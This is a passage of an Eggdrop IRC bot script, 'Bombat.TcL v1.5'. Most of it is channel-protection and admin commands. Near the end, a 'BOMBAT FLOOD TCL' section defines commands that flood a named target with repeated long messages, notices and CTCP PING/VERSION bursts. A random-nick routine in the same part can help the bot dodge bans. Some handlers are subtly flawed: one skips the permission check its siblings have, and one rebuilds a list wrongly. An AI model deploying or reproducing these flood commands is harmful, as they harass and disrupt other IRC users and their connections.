    set ikick [lindex $cinfo [expr $i + 3]]
    set ideop [lindex $cinfo [expr $i + 4]]
    set inick [lindex $cinfo [expr $i + 5]]
    if {![string match "*:*" $inick]} {
      set inick "0"
    }
    append mstatus "\[12G\]uard Flood \[Line12 $ichan Ctcp12 $ictcp Join12 $ijoin Kick12 $ikick De@p12 $ideop Nick12 $inick\] "
    if {${ban-time} != 0} { append mstatus "\[12B\]anTime12 ${ban-time} min " }
  }
  if {[matchattr $cflag V]} { append mstatus "\[12A\]utoVoice12 [getuser $cflag XTRA "VC"] 2nd " }
  if {[matchattr $cflag K]} { append mstatus "\[12K\]ey " }
  if {[matchattr $cflag D]} { append mstatus "Re\[12V\]enge " }
  if {[matchattr $cflag G]} { append mstatus "\[12G\]reeT " }
  if {[matchattr $cflag S]} { append mstatus "\[12S\]pam " }
  if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "\[4@\]psKick " }
  if {[matchattr $cflag R]} { append mstatus "\[12R\]epeat12 [getuser $cflag XTRA "RPT"] " }
  if {[matchattr $cflag U]} { append mstatus "\[12C\]aps12 [getuser $cflag XTRA "CAPS"]% " }
  if {[matchattr $cflag P]} { append mstatus "JoIN\[12P\]art12 [getuser $cflag XTRA "JP"] 2nd " }
  if {[matchattr $cflag T]} { append mstatus "\[12T\]ext12 [getuser $cflag XTRA "CHAR"] Chars " }
  if {[matchattr $cflag J]} { append mstatus "Mass\[12J\]oin " }
  if {[matchattr $cflag L]} { append mstatus "\[12L\]imited12 +[getuser $cflag XTRA "LIMIT"] " }
  if {[string match "*+seen*" $cinfo]} { append mstatus "\[12S\]een " }
  if {[matchattr $cflag O]} { append mstatus "\[12C\]lone12 [getuser $cflag XTRA "CLONE"] MaX " }
  if {[matchattr $cflag E]} { append mstatus "\[12E\]nforceBan " }
  if {[matchattr $cflag C]} { append mstatus "\[12C\]ycle12 [getuser $cflag XTRA "CYCLE"] MnT " }
  if {$mstatus != ""} {
    if {[getuser "config" XTRA "ADMIN"]!=""} {
      set mstatus "11,12&#171;0,1 [string toupper $channel] 11,12&#187; ${mstatus}[getuser "config" XTRA "ADMIN"]"
    } else {
      set mstatus "11,12&#171;0,1 [string toupper $channel] 11,12&#187; ${mstatus}"
    }
  }
  if {[string match "*c*" [getchanmode $channel]]} {
    set mstatus [uncolor $mstatus]
    regsub -all --  $mstatus "" mstatus
  }
  puthlp "PRIVMSG $channel :$mstatus"
}

proc pub_+spam {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [userlist A] {
      chattr $x +S
    }
    puthlp "NOTICE $nick :$fxlogo1 ALL SpaM CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[matchattr $cflag S]} {
    puthlp "NOTICE $nick :$fxlogo1 SpaM $chan \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +S
  puthlp "NOTICE $nick :$fxlogo1 SpaM $chan \[9ON\]"
  saveuser
}

proc pub_-spam {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [userlist A] {
      chattr $x -S
    }
    puthlp "NOTICE $nick :$fxlogo1 ALL SpaM CHaNNeL \[4OFF\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $cflag S]} {
    puthlp "NOTICE $nick :$fxlogo1 SpaM $chan \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -S
  puthlp "NOTICE $nick :$fxlogo1 SpaM $chan \[4OFF\]"
  saveuser
}

proc pub_+cycle {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +cYcLe <minutes>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +C
  setuser $cflag XTRA "CYCLE" $rest
  puthlp "NOTICE $nick :$fxlogo1 cYcLe $chan \[9$rest\] MnT"
  if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
  saveuser
}

proc pub_-cycle {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -C
  setuser $cflag XTRA "CYCLE" ""
  puthlp "NOTICE $nick :$fxlogo1 cYcLe $chan \[4OFF\]"
  saveuser
  foreach x [timers] {
    if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] }
  }
}

proc pub_+greet {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +greet <msg>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +G
  setuser $cflag XTRA "GREET" $rest
  puthlp "NOTICE $nick :$fxlogo1 AuTOGReeT $chan \[$rest\]"
  saveuser
}

proc pub_-greet {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -G
  setuser $cflag XTRA "GREET" ""
  puthlp "NOTICE $nick :$fxlogo1 AuTOGReeT $chan \[4OFF\]"
  saveuser
}

proc pub_+limit {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest == "" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +limit <number>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +L
  setuser $cflag XTRA "LIMIT" $rest
  puthlp "NOTICE $nick :$fxlogo1 LImIT $chan \[9$rest\]"
  saveuser
}

proc pub_-limit {nick uhost hand chan rest} {
  global fxlogo1 lst_limit
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -L
  setuser $cflag XTRA "LIMIT" ""
  puthlp "NOTICE $nick :$fxlogo1 LImIT $chan \[4OFF\]"
  catch { lst_limit($chan) }
  saveuser
}

proc pub_+topic {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +I
  setuser $cflag XTRA "TOPIC" [topic $chan]
  puthlp "NOTICE $nick :$fxlogo1 TopIc $chan \[9LocK\]"
  saveuser
}

proc pub_-topic {nick uhost hand chan rest} {
  global fxlogo1 lst_limit
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -I
  setuser $cflag XTRA "TOPIC" ""
  puthlp "NOTICE $nick :$fxlogo1 TopIc $chan \[4UnLocK\]"
  saveuser
}

proc pub_+joinpart {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +joinpart <seconds>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +P
  setuser $cflag XTRA "JP" $rest
  puthlp "NOTICE $nick :$fxlogo1 JoINPaRT $chan \[9$rest Sec's\]"
  saveuser
}

proc pub_-joinpart {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -P
  setuser $cflag XTRA "JP" ""
  puthlp "NOTICE $nick :$fxlogo1 JoINPaRT $chan \[4OFF\]"
  saveuser
}

proc pub_+clone {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +clone <max>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +O
  setuser $cflag XTRA "CLONE" $rest
  puthlp "NOTICE $nick :$fxlogo1 cLonE $chan MaX \[9$rest\]"
  saveuser
}

proc pub_-clone {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -O
  setuser $cflag XTRA "CLONE" ""
  puthlp "NOTICE $nick :$fxlogo1 cLonE $chan \[4OFF\]"
  saveuser
}

proc pub_+key {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set rest [lindex $rest 0]
  if {$rest==""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +key <word>"
    return 0
  }
  chattr $cflag +K
  setuser $cflag XTRA "CI" [zip $rest]
  puthlp "NOTICE $nick :$fxlogo1 KeY $chan \[9$rest\]"
  saveuser
}

proc pub_-key {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -K
  setuser $cflag XTRA "CI" ""
  puthlp "NOTICE $nick :$fxlogo1 KeY $chan \[4OFF\]"
  saveuser
}

proc pub_+text {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +text <max>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +T
  setuser $cflag XTRA "CHAR" $rest
  puthlp "NOTICE $nick :$fxlogo1 TexT $chan MaX \[9$rest\]"
  saveuser
}

proc pub_-text {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -T
  setuser $cflag XTRA "CHAR" ""
  puthlp "NOTICE $nick :$fxlogo1 TexT $chan \[4OFF\]"
  saveuser
}

proc pub_+caps {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +caps <%percent>"
    return 0
  }
  if {$rest == 0 || $rest > 100} {
    puthlp "NOTICE $nick :$fxlogo1 fill under 1 - 100%"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +U
  setuser $cflag XTRA "CAPS" $rest
  puthlp "NOTICE $nick :$fxlogo1 CAPS $chan \[9$rest%\]"
  saveuser
}

proc pub_-caps {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -U
  setuser $cflag XTRA "CAPS" ""
  puthlp "NOTICE $nick :$fxlogo1 cAPs $chan \[4OFF\]"
  saveuser
}

proc pub_+repeat {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +repeat <max>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +R
  setuser $cflag XTRA "RPT" $rest
  puthlp "NOTICE $nick :$fxlogo1 RePeaT $chan MaX \[9$rest\]"
  saveuser
}

proc pub_-repeat {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -R
  setuser $cflag XTRA "RPT" ""
  puthlp "NOTICE $nick :$fxlogo1 RePeaT $chan \[4OFF\]"
  saveuser
}

proc pub_+autovoice {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage +AuTovoIcE <secs>"
    return 0
  }
  if {$rest == 0} {
    puthlp "NOTICE $nick :$fxlogo1 cAnT UsE NuLL"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +V
  setuser $cflag XTRA "VC" $rest
  puthlp "NOTICE $nick :$fxlogo1 AuTovoIcE $chan qUeUe \[9$rest\] 2nd"
  saveuser
  pub_mvoice $nick $uhost $hand $chan ""
}

proc pub_-autovoice {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -V
  setuser $cflag XTRA "VC" ""
  puthlp "NOTICE $nick :$fxlogo1 AuTovoIcE $chan \[4OFF\]"
  saveuser
  foreach x [utimers] {
    if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
  }
}

proc pub_+enforceban {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +E
  puthlp "NOTICE $nick :$fxlogo1 enforceban $chan \[9ON\]"
  saveuser
}

proc pub_-enforceban {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -E
  puthlp "NOTICE $nick :$fxlogo1 enforceban $chan \[4OFF\]"
  saveuser
}

proc pub_+revenge {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +D
  puthlp "NOTICE $nick :$fxlogo1 revenge $chan \[9ON\]"
  saveuser
}

proc pub_-revenge {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -D
  puthlp "NOTICE $nick :$fxlogo1 revenge $chan \[4OFF\]"
  saveuser
}

proc pub_+forced {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +M
  puthlp "NOTICE $nick :$fxlogo1 forced $chan \[9ON\]"
  saveuser
}

proc pub_-forced {nick uhost hand chan rest} {
  global fxlogo1
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -M
  puthlp "NOTICE $nick :$fxlogo1 forced $chan \[4OFF\]"
  saveuser
}

proc pub_-colour {nick uhost hand chan rest} {
  global fxlogo1 kickclr
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set kickclr "T"
  setuser "config" XTRA "KCLR" "Y"
  puthlp "NOTICE $nick :$fxlogo1 colour kick \[4OFF\]"
  saveuser
}

proc pub_+colour {nick uhost hand chan rest} {
  global fxlogo1 kickclr
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch {unset kickclr}
  setuser "config" XTRA "KCLR" ""
  puthlp "NOTICE $nick :$fxlogo1 colour kick \[9ON\]"
  saveuser
}

proc pub_+ipguard {nick uhost hand channel param} {
  global botname botnick fxlogo1 botnick
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +ipguard <hostname>"
    return 0
  }
  if {$rest == "*" || $rest == "*!*@*"} {
    puthlp "NOTICE $nick :$fxlogo1 invalid hostname..!"
    return 0
  }
  if {![string match "*@*" $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +ipguard <hostname>"
    return 0
  }
  set ipguard [getuser "config" XTRA "IPG"]
  foreach y $ipguard {
    if {$y == $rest} {
      puthlp "NOTICE $nick :$fxlogo1 $rest allready added..!"
      return 0
    }
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 add \[$rest\] To IpguaRd"
  lappend ipguard $rest
  setuser "config" XTRA "IPG" $ipguard
  saveuser
  return 0
}

proc pub_-ipguard {nick uhost hand channel param} {
  global fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -ipguard <hostname>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set ipguard [getuser "config" XTRA "IPG"]
  set nipg ""
  set ok "F"
  foreach y $ipguard {
    if {$y == $rest} {
      set ok "T"
      puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM IpguaRd"
    } else { lappend nipg }
  }
  if {$ok == "T"} {
    setuser "config" XTRA "IPG" $nipg
    saveuser
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 $rest not found..!"
}

proc jc { chan } { putlog "&#171;Bombat&#187; Join check: $chan" }

#####################################
## BOMBAT FLOOD TCL                ##
## Usage:                          ##
##   `floodz[1-2] <target> <pesan> ##
#####################################
set CC "`"

bind pub o|o ${CC}floodz1 pub_plod1
bind pub o|o ${CC}floodz2 pub_plod2

proc pub_plod1 {nick uhost hand channel rest} {
  global fxlogo3
  set fmsg "9,1 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT!9 HAVE 8A 11NICE 0CHAT! "
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  puthelp "PRIVMSG $person :$rest $fmsg"
  puthelp "NOTICE $person :$rest $fmsg"
  puthelp "PRIVMSG $person :$rest $fmsg"
  puthelp "NOTICE $person :$rest $fmsg"
  puthelp "PRIVMSG $person :$rest $fmsg"
  puthelp "NOTICE $person :$rest $fmsg"
  putlog "&#171;Bombat&#187; !$hand! floodz1 $person"
}

proc pub_plod2 {nick uhost hand channel rest} {
  global fxlogo1
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  putserv "PRIVMSG $person :\001PING [unixtime]\001"
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001"
  putserv "PRIVMSG $person :\001PING [unixtime]\001"
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001"
  putserv "PRIVMSG $person :\001PING [unixtime]\001"
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001"
  putlog "&#171;Bombat&#187; !$hand! floodz5 (CTCP flooding)"
}

set misc_char "a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 ^ _ | -"
set first_char "a b c d e f g h i j k l m n o p q r s t u v w x y z"

proc randomnick {} {
  global misc_char first_char
  append temp_nick [lindex $first_char [rand [llength $first_char]]]
  set i 1
  while {$i < 9} {
    append temp_nick [lindex $misc_char [rand [llength $misc_char]]]
    incr i 1
  }
  putserv "NICK ${temp_nick}"
  unset temp_nick
}

proc restorenick {} {
  global ircnick
  putserv "NICK ${ircnick}"
}

#######################################################
putlog "0,12&#171;0,1 Bombat.TcL v1.5 0,12&#187; LoaDeD"
#######################################################
